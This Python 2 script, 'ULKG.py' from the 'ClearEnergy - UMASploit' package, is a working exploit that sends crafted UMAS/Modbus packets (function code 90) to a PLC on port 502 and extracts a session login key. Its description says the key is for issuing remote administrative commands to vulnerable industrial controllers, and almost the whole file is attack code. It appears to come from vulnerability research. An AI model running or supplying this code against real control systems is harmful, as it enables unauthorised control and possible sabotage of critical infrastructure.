#!/usr/bin/env python

import socket
import array
import optparse
import sys
import time

__file__ = "ULKG.py"
__project__ = "ClearEnergy - UMASploit | UMAS Login Key Generator (ULKG)"
__version__ = "1.0.1 Beta"
__description__ = "UMAS Login Key Generator (ULKG) is part of ClearEnergy - UMASploit package. ULKG allows to send a login request to target PLC that vulnerable to ClearEnergy vulnerabilities in order to get a UMAS Session Key (Identifier). You can use this session key later with Modbus Remote Command Tool (MRCT) in order to send remote adminitrative commands to the vulnerable PLC."
__author__ = "CRITIFENCE, Critical Infrastructure and SCADA/ICS Cyber Threats Research Group"
__copyright__ = "COPYRIGHTS (c) 2017, CRITIFENCE"
__license__ = "GNU GPL 3.0"


# ****************
# General settings
# ****************
IP = "8.8.8.70"
PORT = "502"
TIMEOUT = 500
DEBUG = False


# ************
# Command list
# ************

# hello
hello = "\x00\x01\x00"
# login_request
login_request = "\x00\x11"
# login_challenge
login_challenge = "\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"


# **************
# Commands array 
# **************
packets = [hello, login_request, login_challenge]


banner = """\

+ ======================================================================================
+ ------------------  ClearEnergy | UMAS Login Key Generator (ULKG)  -------------------
+ ======================================================================================
+ Version: 1.0.1 Beta
+ Author: CRITIFENCE, Critical Infrastructure and SCADA/ICS Cyber Threats Research Group
+ Copyright: COPYRIGHTS (c) 2017, CRITIFENCE
+ ======================================================================================
"""

key = "\\x6b"
msg = ""
fError = 0
rsid = ""
payload = ""
s = ""

def start_banner():
    print banner
    print "[ULKG] Connecting to target controller...\r\n"


def generate_packet(payload):
    global rsid
    # PACKET mbap array
    rsid = array.array('B')
    rsid.fromstring("\x00\x00\x00\x00\x00\x02\x01\x01")

    #set unit id
    rsid[6]=1
    
    #set function
    rsid[7]=90

    # PACKET data array
    packet_data = array.array('B')
    packet_data.fromstring(payload)


    # add data and update data length
    if (packet_data):
        rsid += packet_data

	    #update length
        rsid[5]=len(packet_data)+2
        if DEBUG == True:
            print "[DEBUG] building packet data: "+str(packet_data)



def attack():
    global fError, msg, s
    # *****************************
    # Open connection to target PLC
    # *****************************
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(float(TIMEOUT) / float(100))			
        s.connect((str(IP), int(PORT)))
    


    except socket.error:
	    #clean up
        fError=1
        msg += "[ERROR] FAILED TO CONNECT"
        s.close()

    try:
        print "[ULKG] Sending login request to target controller...\r\n"
        for packet in packets:            
            generate_packet(packet)
            if DEBUG == True:
                print "[INFO] Sending packet: "+str(rsid)
            s.send(rsid)
            catch_res()
            time.sleep(1)
            
    except socket.error:
	    #failed send close socket
        fError=1
        msg += "[ERROR] FAILED TO SEND"
        s.close()


def catch_res():
    global fError, key
    # *****************
    # Response handling
    # *****************
    try:
	    #recieve data
        data = s.recv(4096)

    except socket.timeout:
        fError=1
        msg += "[ERROR] FAILED TO RECV"

    #examine response
    if data:
	    #parse response
        resp = array.array('B')
        resp.fromstring(data)

        if DEBUG == True:
            print "[INFO] Recieving packet: "+str(resp)

        if int(resp[5]) == 5:
            key = hex(int(resp[10]))
            print "[ULKG] UMAS Login Key: "+str(key)+"\r\n"

	    #if the function matches the one sent we are all good
        if (int(resp[7]) == 90):
            if DEBUG == True:
                print "[INFO] Recieving valid response function code from target..."						
        else:
            if (DEBUG == True):
                print "[WARNING] Unable to parse the response."				
    else:
        fError=1
        msg += "\tFAILED TO RECIEVE"
        s.close()


    if (fError):
        print msg
    


def start_ulkg():
    #start_banner()
    attack()
    s.close()
    if DEBUG == True:
        print "[ULKG] UMAS Login Key " + str(key) + " is ready to use.\r\n\r\n"
    return "[ULKG] UMAS Login Key " + str(key) + " is ready to use.\r\n"






